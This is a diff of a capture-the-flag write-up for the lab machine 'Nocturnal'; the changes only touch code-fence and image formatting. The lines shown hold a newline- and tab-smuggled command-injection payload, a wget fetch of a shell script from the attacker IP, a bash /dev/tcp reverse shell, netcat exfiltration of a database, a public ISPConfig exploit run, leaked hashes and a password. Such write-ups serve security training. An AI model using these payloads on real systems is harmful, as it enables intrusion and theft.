@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+	```
 nmap -sV -sC -vv 10.10.11.64
 nmap -sU --top-ports=10 -vv 10.10.11.64
 
@@ -32,14 +32,14 @@ n/a
 ```
 ----
 - port 7777 on url gives us a db:
-	```bash
+	```
 sqlite3 nocturnal_database.db .tables
 
 --OUTPUT---
 uploads  users
 ```
 - We check users:
-	```bash
+	```
 sqlite3 nocturnal_database.db "select * from users" -cmd ".headers on"
 
 ---OUTPUT---
@@ -52,7 +52,7 @@ sqlite3 nocturnal_database.db "select * from users" -cmd ".headers on"
 9|jeff|166ee015c0e0934a8781e0c86a197c6e
 ```
 - I check the length:
-	```bash
+	```
 echo -n "d725aeba143f575736b07e045d8ceebb" | wc -c
 
 ---OUTPUT---
@@ -73,32 +73,32 @@ echo -n "d725aeba143f575736b07e045d8ceebb" | wc -c
 		- http://nocturnal.htb/view.php?username=test&file=php-reverse-shell.php.pdf
 			- It seems there is no password check when checking for uploaded files:
 - We try out all users with that url and we find a privacy.odt file for amanda which gives her credentials:
-	- ![[Pasted image 20250425184119.png]]
+	- ![Pasted image 20250425184119.png](../Attachments/Pasted%20image%2020250425184119.png)
 	- `arHkG7HAI68X8s1J`
 - I log into amanda with credentials and find admin panel.
 	- We can do a backup.
 - We check admin.php and we can see a vulnerable code which takes user input into a command:
-	```bash
+	```
 $command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
 ```
 	- We also see some sanitization being done:
-		```bash
+		```
 $blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
 ```
 		- Doesn't include new line or tab
 - With burpsuite we capture the packet when backing up and use 
-	![[Pasted image 20250425191149.png]]
+	![Pasted image 20250425191149.png](../Attachments/Pasted%20image%2020250425191149.png)
 - We see we are www-data
 - We can pass a reverse shell here:
 	- We create a file "shell" with our exploit and host it in our python server:
-		```bash
+		```
 cat shell
 python3 -m http.server 80
 ---OUTPUT---
 sh -c 'bash -i >& /dev/tcp/10.10.14.25/9999 0>&1'
 ```
 - Then in BurpSuite we download it and then execute it with netcat listening on the port:
-	```bash
+	```
 password=%0Abash%09-c%09"wget%0910.10.14.25/shell"&backup=
 password=%0Abash%09-c%09"bash%09shell"&backup=
 
@@ -116,7 +116,7 @@ www-data
 www-data@nocturnal:~/nocturnal.htb$
 ```
 - Here we can then send nocturnal_database.db to our machine:
-	```bash
+	```
 ---ON-LOCAL-MACHINE---
 nc -lvnp 9998 > nocturnal_database.db
 
@@ -127,7 +127,7 @@ cat nocturnal_database.db > /dev/tcp/10.10.14.25/9998
 		- We can get user flag.
 ## Privilege Escalation
 - On enumeration I pass :
-	```bash
+	```
 sss -tlnp 
 
 ---OUTPUT---
@@ -145,7 +145,7 @@ LISTEN                   0                        128                           
 ```
 	- We see there is something running on 8080 on the localhost which our nmap didn't catch.
 - We tunnel it through our ssh:
-	```bash
+	```
 ssh tobias@nocturnal.htb -L 8002:127.0.0.1:8080
 ```
 - We then go to the url to find its an ispconfig login (we also saw it in /var/www but we oculdn't access it)
@@ -156,7 +156,7 @@ ssh tobias@nocturnal.htb -L 8002:127.0.0.1:8080
 	- I search for an exploit and find :
 		- https://github.com/bipbopbup/CVE-2023-46818-python-exploit
 	- We pass the exploit:
-		```bash
+		```
 python3 exploit.py http://127.0.0.1:8002 admin slowmotionapocalypse
 
 ---OUTPUT---
@@ -171,7 +171,7 @@ root
 ```
 - We don't seem to be able to move out of the directory but we can pass commands as root.
 	- We read root.txt
-		```bash
+		```
 ispconfig-shell> pwd
 ispconfig-shell> ls /root
 ispconfig-shell> cat /root/root.txt
@@ -189,34 +189,34 @@ a3fc38137149fe518fbde2aba2786b47
 ```
 ## SMB Enumeration
 - t
-	```bash
+	```
 
 ```
 - crackmapexec/netexec
-	```bash
+	```
 
 ```
 ---
 ## Directory Enumeration
 - Gobuster:
 	- Directory
-		```bash
+		```
 
 ```
 		- Next Directory
-			```bash
+			```
 
 ```
 	- VHost
-		```bash
+		```
 
 ```
 - Ffuf
-	```bash
+	```
 
 ```
 - Dirsearch
-	```bash
+	```
 
 ```
 - Dirbuster
